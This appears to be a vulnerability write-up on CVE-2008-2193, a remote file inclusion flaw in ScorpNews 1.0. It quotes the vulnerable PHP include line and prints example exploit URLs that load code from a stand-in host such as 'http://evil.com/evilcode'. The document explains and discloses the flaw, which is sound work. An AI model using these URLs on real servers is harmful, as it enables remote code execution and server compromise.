Based on the provided information, here's an analysis of CVE-2008-2193:

**Root Cause of Vulnerability:**

*   The vulnerability lies in the `example.php` file of ScorpNews 1.0.
*   The script uses an `include` statement that incorporates a file specified by a user-controlled `site` parameter.
*   The vulnerable code is: `<? include $site.'.php';?>`

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI, allowing an attacker to include a remote file. The lack of input sanitization on the `site` parameter makes this possible.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to complete server compromise.
*   **Data theft/manipulation:** An attacker could use this vulnerability to potentially steal or modify sensitive data on the affected server.

**Attack Vectors:**

*   **HTTP GET Request:** The attack is carried out using an HTTP GET request, targeting the `example.php` file.
*   **`site` Parameter:** The attacker supplies a URL to a malicious file through the `site` parameter in the GET request.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to have network access to the vulnerable server.
*   **Knowledge of the vulnerable path:** The attacker needs to know the path to the vulnerable `example.php` file.
*   **Web Server:** The attacker needs to be able to host or have access to a web server that hosts the malicious payload.

**Technical Details**

*   The vulnerable code snippet `<? include $site.'.php';?>` shows that the script is directly including a PHP file whose name is given through the URL parameter named `site`. The attacker can set the `site` parameter to a URL like `http://evil.com/evilcode`, which means the web server will then execute the file content downloaded from `http://evil.com/evilcode.php`.
* The provided exploit examples showcase how a malicious URL can be passed through the `site` parameter to include remote files.
* Example exploit URLs are shown as `http://www.example.com/example.php?site=http://shell` and `http://www.example.com/news/example.php?site=http://shell`, where "http://shell" would point to the attacker's controlled server with malicious php code.
